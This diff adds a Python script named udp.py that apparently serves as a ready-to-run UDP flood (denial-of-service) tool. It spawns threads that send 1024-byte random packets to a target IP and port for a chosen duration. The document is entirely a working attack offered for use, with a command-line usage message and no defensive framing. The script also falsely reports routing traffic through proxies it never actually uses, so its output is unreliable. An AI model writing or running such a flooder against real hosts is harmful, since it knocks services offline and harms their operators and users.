@@ -1,0 +1,62 @@
+import socket
+import random
+import time
+import sys
+import threading
+
+def udp_attack(target_ip, target_port, duration, proxy_file, rpc):
+    proxies = []
+    try:
+        with open(proxy_file, 'r') as file:
+            proxies = file.read().splitlines()
+    except FileNotFoundError:
+        print(f"Proxy file '{proxy_file}' not found.")
+        return
+
+    end_time = time.time() + duration
+    payload = random._urandom(1024)  # 1024-byte random payload
+
+    while time.time() < end_time:
+        proxy = random.choice(proxies).split(":")
+        if len(proxy) != 2:
+            print(f"Invalid proxy format in '{proxy_file}'. Expected format: IP:PORT")
+            continue
+
+        proxy_ip, proxy_port = proxy[0], int(proxy[1])
+
+        try:
+            for _ in range(rpc):
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                sock.sendto(payload, (target_ip, target_port))
+            print(f"Attack successfully sent to {target_ip}:{target_port} with proxy {proxy_ip}:{proxy_port}")
+        except Exception as e:
+            print(f"Attack failed, [Reason : {str(e)}]")
+
+def start_attack(target_ip, target_port, duration, proxy_file, threads, rpc):
+    thread_list = []
+
+    for _ in range(threads):
+        thread = threading.Thread(target=udp_attack, args=(target_ip, target_port, duration, proxy_file, rpc))
+        thread.start()
+        thread_list.append(thread)
+
+    for thread in thread_list:
+        thread.join()
+
+if __name__ == "__main__":
+    if len(sys.argv) != 6:
+        print("Usage: python3 udp.py IP:PORT [proxy filename] [Duration in seconds] [Threads] [RPC]")
+        sys.exit(1)
+
+    target = sys.argv[1].split(":")
+    if len(target) != 2:
+        print("Invalid target format. Expected format: IP:PORT")
+        sys.exit(1)
+
+    target_ip, target_port = target[0], int(target[1])
+    proxy_file = sys.argv[2]
+    duration = int(sys.argv[3])
+    threads = int(sys.argv[4])
+    rpc = int(sys.argv[5])
+
+    start_attack(target_ip, target_port, duration, proxy_file, threads, rpc)
